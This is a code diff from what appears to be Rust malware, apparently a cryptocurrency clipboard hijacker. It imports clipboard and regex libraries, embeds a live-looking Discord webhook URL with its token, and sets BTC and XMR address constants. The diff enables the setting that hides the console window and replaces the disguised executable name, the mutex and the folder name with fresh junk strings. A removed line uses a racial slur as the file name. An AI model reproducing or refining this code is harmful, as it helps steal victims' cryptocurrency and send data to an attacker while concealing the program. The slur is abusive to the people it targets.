@@ -1,4 +1,4 @@
-// #![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
 
 use clipboard::{windows_clipboard::WindowsClipboardContext, ClipboardProvider};
 use regex::Regex;
@@ -15,9 +15,9 @@ mod os;
 mod discord;
 
 static WEBHOOK: &str = "https://discord.com/api/webhooks/1103404480541765762/QTXDSkjxpTS14SEPL4_88qj80fuvEddkLEAS9mjui1hVsx0CpnB252k0mT_RjFgvbKl9";
-static FILE_NAME: &str = "nigga.exe";
-static MUTEX: &str = "sdkjlhfjh3kj4h3jkh";
-static FOLDER_NAME: &str = "dsffsddfs";
+static FILE_NAME: &str = "bobux.exe";
+static MUTEX: &str = "asdfsadfsd09f78sd98f7sd";
+static FOLDER_NAME: &str = "sdfsdfsdfsdfds";
 
 const BTC_ADDR: &str = "h";
 const XMR_ADDR: &str = "dfssdf";
